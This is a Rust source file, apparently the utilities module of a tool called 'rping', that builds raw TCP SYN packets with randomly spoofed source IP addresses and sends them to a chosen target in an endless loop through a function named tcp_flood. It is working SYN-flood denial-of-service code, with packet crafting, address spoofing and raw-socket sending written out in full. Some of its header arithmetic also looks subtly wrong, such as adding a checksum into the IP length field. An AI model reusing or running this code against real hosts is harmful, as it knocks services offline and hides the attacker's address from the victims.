use crate::ip::IpHeader;
use crate::tcp::TcpHeader;
use indicatif::{ProgressBar, ProgressStyle};
use rand::Rng;
use socket2::{Domain, Protocol, SockAddr, Socket, Type};
use std::io;
use std::net::{Ipv4Addr, SocketAddrV4};
use std::str::FromStr;
use std::time::SystemTime;

/// Calculates the TCP checksum.
///
/// # Arguments
///
/// * `ip_header` - The IP header.
/// * `tcp_header` - The TCP header.
///
/// # Returns
///
/// (`u16`): The calculated TCP checksum.
///
/// # Examples
///
/// ```
/// use rping::utils::{calculate_tcp_checksum};
/// use rping::ip::{IpHeader};
/// use rping::tcp::{TcpHeader};
///
///
/// let ip_header = IpHeader {
///     version_ihl: 0x45,
///     ttl: 64,
///     source_ip: 0xC0A80001, // 192.168.0.1
///     dest_ip: 0xC0A80002,   // 192.168.0.2
///     protocol: 6,
///     len: 0,
/// };
///
/// let tcp_header = TcpHeader {
///     sport: 8080,
///     dport: 80,
///     seq: 12345,
///     ack: 0,
///     offx2: 0x50,
///     flags: 0x02,
///     win: 1024,
///     sum: 0,
///     urp: 0,
/// };
///
/// let checksum = calculate_tcp_checksum(&ip_header, &tcp_header);
/// assert_eq!(checksum, 50155);
/// ```
pub fn calculate_tcp_checksum(ip_header: &IpHeader, tcp_header: &TcpHeader) -> u16 {
    let pseudo_header = [
        ((u32::from_be(ip_header.source_ip) >> 16) & 0xFFFF) as u16,
        (u32::from_be(ip_header.source_ip) & 0xFFFF) as u16,
        ((u32::from_be(ip_header.dest_ip) >> 16) & 0xFFFF) as u16,
        (u32::from_be(ip_header.dest_ip) & 0xFFFF) as u16,
        u16::from_be(ip_header.protocol.into()),
        std::mem::size_of::<TcpHeader>() as u16,
    ];

    let tcp_header_bytes: &[u8] = tcp_header.as_bytes();

    let mut sum = 0u32;

    // Sum pseudo header
    for word in pseudo_header.iter() {
        sum = sum.wrapping_add(u32::from(*word));
    }

    // Sum TCP header and payload
    for i in (0..tcp_header_bytes.len()).step_by(2) {
        if i + 1 < tcp_header_bytes.len() {
            sum = sum.wrapping_add(
                (u32::from(tcp_header_bytes[i])) << 8 | u32::from(tcp_header_bytes[i + 1]),
            );
        } else {
            sum = sum.wrapping_add(u32::from(tcp_header_bytes[i]) << 8);
        }
    }

    // Fold 32-bit sum to 16 bits
    while sum >> 16 != 0 {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    sum as u16
}

/// Sends a raw IP packet with the given headers and source IP address.
///
/// This function constructs a raw IP packet using the provided headers and sends it to the specified destination.
/// It uses the `socket2` library for creating a raw socket and sending the packet.
/// The source IP address is set directly in the packet buffer.
///
/// # Arguments
/// * `ip_header` - A slice representing the IP header.
/// * `source_ip` - The source IP address to be set in the packet.
/// * `dest_ip` - The destination IP address as a string.
/// * `dest_port` - The destination port number.
/// * `packet_len` - The syn packet length.
///
/// # Returns
/// This function does not return a meaningful result. Panics if there is an error during packet sending.
///
/// # Examples
///
/// ```rust
/// use rping::utils::send_raw_ip_packet;
///
/// // Example usage of the send_raw_ip_packet function
/// let ip_header: &[u8] = &[];
/// let source_ip = 0xC0A80001u32 as i32; // Example source IP
/// let dest_ip = "192.168.0.2";
/// let dest_port = 8080;
/// // send_raw_ip_packet(ip_header, source_ip, dest_ip, dest_port, 1500);
/// ```
pub fn send_raw_ip_packet(
    ip_header: &[u8],
    source_ip: u32,
    dest_ip: &str,
    dest_port: u16,
    packet_len: usize,
) -> io::Result<()> {
    let socket = Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::from(6))).unwrap();

    let dest_addr = SocketAddrV4::new(dest_ip.parse().unwrap(), dest_port);

    // Connect the socket
    socket.connect(&SockAddr::from(dest_addr)).unwrap();

    let bytes = {
        let ip_header_bytes: &[u8] = ip_header;
        ip_header_bytes
    };

    // Ensure buffer has enough space
    let mut buffer = vec![0u8; packet_len];
    buffer[..bytes.len()].copy_from_slice(bytes);

    // Set the source IP address directly in the buffer
    buffer[12..16].copy_from_slice(&source_ip.to_be_bytes());

    // Use `send` to send data on a connected TCP socket
    socket.send(&buffer)?;

    Ok(())
}

/// Generates a random IP address within the range [0.0.0.0, 255.255.255.255].
///
/// # Returns
///
/// (`u32`): The generated random IP address.
///
/// # Examples
///
/// ```
/// use rping::utils::generate_random_ip;
///
/// let random_ip = generate_random_ip();
/// ```
pub fn generate_random_ip() -> u32 {
    let min_ip: u32 = Ipv4Addr::new(0, 0, 0, 0).into();
    let max_ip: u32 = Ipv4Addr::new(255, 255, 255, 255).into();
    let random_ip: u32 = rand::thread_rng().gen_range(min_ip..=max_ip);
    random_ip
}
/// Fills in a TCP header with random values.
///
/// # Arguments
///
/// * `dest_port` - The target port.
///
/// # Returns
///
/// (`TcpHeader`): The TCP header with random values.
///
/// # Examples
///
/// ```
/// use rping::utils::fill_tcp_header;
///
/// let tcp_header = fill_tcp_header(80);
/// // Ensure that relevant fields have been initialized properly.
/// assert_ne!(tcp_header.sport, 0);
/// assert_ne!(tcp_header.seq, 0);
/// ```
pub fn fill_tcp_header(dest_port: u16) -> TcpHeader {
    let mut rng = rand::thread_rng();
    TcpHeader {
        sport: (SystemTime::now()
            .duration_since(SystemTime::UNIX_EPOCH)
            .unwrap()
            .as_millis()
            % u16::MAX as u128) as u16,
        dport: dest_port.to_be(),
        seq: rng.gen::<u32>().to_be(),
        ack: 0,
        offx2: 80,
        flags: 2,
        win: rng.gen::<u16>().to_be(),
        sum: 0,
        urp: 0,
    }
}

/// Fills in an IP header with the given source IP and computes the length and checksum.
///
/// # Arguments
///
/// * `source_ip` - The source IP address.
/// * `dest_ip` - The target ip.
/// * `dest_port` - The target port.
///
/// # Returns
///
/// (`IpHeader`): The IP header with calculated length and checksum.
///
/// # Examples
///
/// ```
/// use rping::utils::{fill_ip_header, generate_random_ip, calculate_tcp_checksum};
///
/// let source_ip = generate_random_ip();
/// let ip_header = fill_ip_header(source_ip, "192.168.1.10", 80);
/// // Ensure that relevant fields have been initialized properly.
/// assert_eq!(ip_header.version_ihl, (4 << 4) | 5);
/// assert_eq!(ip_header.protocol, 6);
/// ```
pub fn fill_ip_header(source_ip: u32, dest_ip: &str, dest_port: u16) -> IpHeader {
    let mut ip_header = IpHeader {
        version_ihl: (4 << 4) | 5,
        ttl: 50,
        source_ip,
        dest_ip: Ipv4Addr::from_str(dest_ip).unwrap().into(),
        protocol: 6,
        len: 0,
    };

    ip_header.len = ip_header
        .len
        .wrapping_add(std::mem::size_of::<IpHeader>() as u16);
    ip_header.len = ip_header
        .len
        .wrapping_add(std::mem::size_of::<TcpHeader>() as u16);
    ip_header.len = ip_header
        .len
        .wrapping_add(calculate_tcp_checksum(
            &ip_header,
            &fill_tcp_header(dest_port),
        ))
        .to_be();

    ip_header
}
/// Creates a combined header by concatenating the bytes of IP and TCP headers.
///
/// # Arguments
///
/// * `ip_header` - The IP header.
/// * `tcp_header` - The TCP header.
///
/// # Returns
///
/// (`Vec<u8>`): The combined header bytes.
///
/// # Examples
///
/// ```
/// use rping::utils::{fill_ip_header, fill_tcp_header, create_combined_header, generate_random_ip};
/// use rping::tcp::TcpHeader;
/// use rping::ip::IpHeader;
///
/// let source_ip = generate_random_ip();
/// let ip_header = fill_ip_header(source_ip, "192.168.0.1", 80);
/// let tcp_header = fill_tcp_header(80);
///
/// let combined_header = create_combined_header(&ip_header, &tcp_header);
/// // Ensure that the combined header has the expected length.
/// assert_eq!(combined_header.len(), std::mem::size_of::<IpHeader>() + std::mem::size_of::<TcpHeader>());
/// ```
pub fn create_combined_header(ip_header: &IpHeader, tcp_header: &TcpHeader) -> Vec<u8> {
    let ip_bytes = ip_header.as_bytes();
    let tcp_bytes = tcp_header.as_bytes();

    ip_bytes
        .iter()
        .cloned()
        .chain(tcp_bytes.iter().cloned())
        .collect()
}

/// Generates and sends TCP flood packets in an infinite loop.
///
/// This function continuously generates TCP flood packets with random parameters and sends them.
/// It uses a loop to perform the following steps:
/// 1. Fill in the TCP header with random values.
/// 2. Fill in the IP header with random values and calculate the packet length.
/// 3. Calculate the TCP checksum.
/// 4. Combine the IP and TCP headers into a buffer.
/// 5. Set the source IP address in the buffer.
/// 6. Send the spoofed packet using the `send_raw_ip_packet` function.
///
/// # Arguments
///
/// * `packet_len` - The packet length.
/// * `dest_ip` - The target ip.
/// * `dest_port` - The target port.
///
/// # Returns
/// This function does not return as it runs in an infinite loop.
///
/// # Examples
/// ```rust
/// use rping::utils::tcp_flood;
///
/// // Example usage of the tcp_flood function
/// // tcp_flood(1500, "192.168.1.10", 80);
/// ```
pub fn tcp_flood(packet_len: usize, dest_ip: &str, dest_port: u16) {
    let mut buffer = vec![0u8; packet_len];
    let progress_bar = ProgressBar::new_spinner();
    progress_bar.set_style(
        ProgressStyle::default_spinner()
            .tick_chars("/|\\- ")
            .template("{spinner:.green} {msg}")
            .unwrap(),
    );
    progress_bar.set_message("Flooding...");

    loop {
        let source_ip = generate_random_ip();
        let ip_header = fill_ip_header(source_ip, dest_ip, dest_port);
        let tcp_header = fill_tcp_header(dest_port);

        let combined_header_slice = create_combined_header(&ip_header, &tcp_header);
        buffer[..combined_header_slice.len()].copy_from_slice(&combined_header_slice);

        let _ = send_raw_ip_packet(&buffer, source_ip, dest_ip, dest_port, packet_len);
        progress_bar.inc(1);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_calculate_tcp_checksum() {
        let ip_header = IpHeader {
            version_ihl: 0x45,
            ttl: 64,
            source_ip: 0xC0A80001, // 192.168.0.1
            dest_ip: 0xC0A80002,   // 192.168.0.2
            protocol: 6,
            len: 0,
        };

        let tcp_header = TcpHeader {
            sport: 8080,
            dport: 80,
            seq: 12345,
            ack: 0,
            offx2: 0x50,
            flags: 0x02,
            win: 1024,
            sum: 0,
            urp: 0,
        };

        let checksum = calculate_tcp_checksum(&ip_header, &tcp_header);

        assert_eq!(checksum, 50155);
    }

    #[test]
    fn test_fill_tcp_header() {
        let tcp_header = fill_tcp_header(80);
        // Ensure that relevant fields have been initialized properly.
        assert_ne!(tcp_header.sport, 0);
        assert_ne!(tcp_header.seq, 0);
    }

    #[test]
    fn test_fill_ip_header() {
        let source_ip = generate_random_ip();
        let ip_header = fill_ip_header(source_ip, "192.168.1.10", 80);
        // Ensure that relevant fields have been initialized properly.
        assert_eq!(ip_header.version_ihl, (4 << 4) | 5);
        assert_eq!(ip_header.protocol, 6);
    }

    #[test]
    fn test_create_combined_header() {
        let source_ip = generate_random_ip();
        let ip_header = fill_ip_header(source_ip, "192.168.1.10", 80);
        let tcp_header = fill_tcp_header(80);

        let combined_header = create_combined_header(&ip_header, &tcp_header);
        // Ensure that the combined header has the expected length.
        assert_eq!(
            combined_header.len(),
            std::mem::size_of::<IpHeader>() + std::mem::size_of::<TcpHeader>()
        );
    }
}
